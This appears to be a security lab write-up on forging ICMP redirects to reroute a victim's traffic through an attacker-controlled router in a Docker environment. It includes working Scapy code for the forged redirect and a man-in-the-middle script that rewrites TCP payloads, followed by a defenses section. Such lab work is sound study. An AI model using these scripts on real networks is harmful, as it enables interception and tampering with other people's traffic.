---
layout: post
title: "ICMP Redirect Attack"
category: seed-labs
tags: [networking, icmp, mitm, scapy, routing]
date: december 5, 2025
---

## Overview

ICMP redirect is an error message that a router sends back to the source of an IP packet when it determines the packet should have been forwarded through a different router. It tells the sender to update its routing for future packets to that destination. This mechanism has no authentication, so an attacker can forge these messages to silently manipulate a victim's routing table.

In this lab, the goal was to forge ICMP redirect packets so that traffic from the victim destined for 192.168.60.5 is rerouted through a malicious router container at 10.9.0.111. Because the attacker controls that router, all intercepted traffic can be modified before being forwarded, enabling a MITM attack.

## Environment Setup

The lab used 6 Docker containers:

| Container | Role |
|---|---|
| 10.9.0.11 | Legitimate router |
| 10.9.0.111 | Malicious router (attacker-controlled) |
| 10.9.0.5 | Victim |
| 192.168.60.5 | Host 1 (destination) |
| 192.168.60.6 | Host 2 |
| Attacker | Script runner |

Before the attack, the victim was confirmed to accept ICMP redirects:

```bash
bash -c "sysctl net.ipv4.conf.all.accept_redirects; sysctl net.ipv4.conf.eth0.accept_redirects"
# net.ipv4.conf.all.accept_redirects = 1
# net.ipv4.conf.eth0.accept_redirects = 1
```

The `mtr -n` command was used to check the victim's normal routing before the attack (traffic goes through the legitimate router, not through 10.9.0.111).

## Attack Methodology

### Task 1 - ICMP Redirect to Poison the Victim's Routing Cache

The attack script crafts a forged ICMP redirect packet. The outer IP header spoofs the legitimate router (10.9.0.11) as source and targets the victim (10.9.0.5). The ICMP header uses type 5, code 1 (redirect for host), with the gateway field set to the malicious router (10.9.0.111). An inner IP packet is embedded to pass the OS sanity check - it must match traffic the victim is actively sending.

```python
#!/usr/bin/python3

from scapy.all import *

ip   = IP(src='10.9.0.11', dst='10.9.0.5')
icmp = ICMP(type=5, code=1)
icmp.gw = '10.9.0.111'

# The enclosed IP packet should be the one that
# triggers the redirect message.
ip2  = IP(src='10.9.0.5', dst='192.168.60.5')
send(ip / icmp / ip2 / ICMP())
```

A continuous ping from the victim to 192.168.60.5 was kept running in the background during the attack. This was necessary because the OS removes routing cache entries after a short idle period and routing would revert to normal otherwise:

```bash
ping 192.168.60.5 &
```

The attack was run in a loop so the redirect kept refreshing. After it took effect, `mtr -n` on the victim showed traffic to 192.168.60.5 now routing through 10.9.0.111 instead of the legitimate router.

---

**Question 1: Can ICMP redirect target a remote machine as the new gateway?**

The gateway field was changed to a remote machine outside the local subnet:

```python
icmp.gw = '10.9.0.99'
```

The attack had no effect. ICMP redirects only work for gateways reachable on the same local network segment. The OS ignores redirect messages pointing to remote gateways.

---

**Question 2: Can ICMP redirect work if the victim is not actively sending traffic?**

The background ping was stopped before launching the attack. The routing cache did not change. The OS only processes redirect messages that correspond to traffic it is currently sending, so the embedded inner packet must match an active flow.

---

**Question 3: What happens if the malicious router has ICMP redirects enabled?**

The docker-compose.yml sysctl settings for the malicious router were changed from 0 to 1:

```yaml
sysctls:
    - net.ipv4.ip_forward=1
    - net.ipv4.conf.all.send_redirects=1
    - net.ipv4.conf.default.send_redirects=1
    - net.ipv4.conf.eth0.send_redirects=1
```

The attack failed. When `send_redirects` is enabled, the malicious router behaves like a normal router and automatically generates its own ICMP redirect messages, which interfere with the forged ones and cause the victim's routing to flip back. In the original lab setup these are set to 0 specifically to prevent this.

### Task 2 - Full MITM Attack

IP forwarding was set to 0 on the malicious router so intercepted packets would not be forwarded automatically, forcing all traffic through the Scapy MITM script instead:

```bash
sysctl -w net.ipv4.ip_forward=0
```

The victim was made to ping the legitimate router to generate traffic. The ICMP redirect attack was launched to poison the routing cache. Then the MITM script was started on the malicious router.

The `mitm.py` script sniffs TCP packets arriving from the victim, replaces a target string in the payload, and re-sends the modified packet to the destination:

```python
#!/usr/bin/env python3
from scapy.all import *

print("Launching attack!")

def spoof_pkt(pkt):
    newpkt = IP(bytes(pkt[IP]))
    del(newpkt.chksum)
    del(newpkt[TCP].payload)
    del(newpkt[TCP].chksum)

    if pkt[TCP].payload:
        data = pkt[TCP].payload.load
        print("*** %s, length: %d" % (data, len(data)))

        # Replace a pattern
        newdata = data.replace(b'assmaa', b'AAAAAA')

        send(newpkt / newdata)
    else:
        send(newpkt)

f = 'tcp and ether src 02:42:0a:09:00:05'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
```

A netcat server was started on the host container:

```bash
/ host-192.168.60.5$ nc -lp 9090
```

The victim connected to it:

```bash
nc 192.168.60.5 9090
```

Messages typed by the victim containing "assmaa" arrived at the host as "AAAAAA". The host terminal showed:

```
test
AAAAAA
```

---

**Question 4: Which direction needs to be filtered in the MITM script?**

Only packets from the victim to the host need to be filtered and modified. The attacker wants to alter the content the victim sends. The sniff filter `tcp and ether src 02:42:0a:09:00:05` targets traffic from the victim specifically. Replies from the host travel a different path and do not need modification.

---

**Question 5: Infinite loop issue with the MITM script**

The malicious router was capturing its own forwarded packets, then forwarding them again, creating an infinite loop. Filtering strictly on the victim's source address (`tcp and src host 10.9.0.5`) resolved it by ignoring packets the script itself sent:

```python
f = 'tcp and src host 10.9.0.5'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
```

After the fix, the attack worked correctly. All words except the target name passed through unchanged, and the malicious router stopped looping.

## Key Findings

- Forged ICMP redirect packets can silently reroute a victim's traffic to an attacker-controlled router.
- The attack must run continuously because routing cache entries expire.
- The OS ignores redirect messages that do not correspond to active outbound traffic, so a background ping is required to keep the cache entry alive.
- ICMP redirects only apply to gateways on the same local subnet.
- Enabling `send_redirects` on the malicious router breaks the attack by generating conflicting legitimate redirect messages.
- The MITM script's sniff filter must be specific enough to avoid capturing its own forwarded packets.

## Defense Implications

- Disable ICMP redirect acceptance on hosts: `sysctl -w net.ipv4.conf.all.accept_redirects=0`
- Monitor for unexpected routing cache changes on critical hosts.
- Use encrypted protocols (TLS, SSH) so that even if traffic is redirected, the attacker cannot read or modify it meaningfully.
- Network segmentation and static routes on sensitive machines reduce the attack surface.

## Tools Used

- Scapy (packet crafting and sniffing)
- Docker (containerized lab environment)
- mtr (routing path verification before and after attack)
- netcat (MITM verification)
- Linux routing tools (ip route, sysctl, ping)
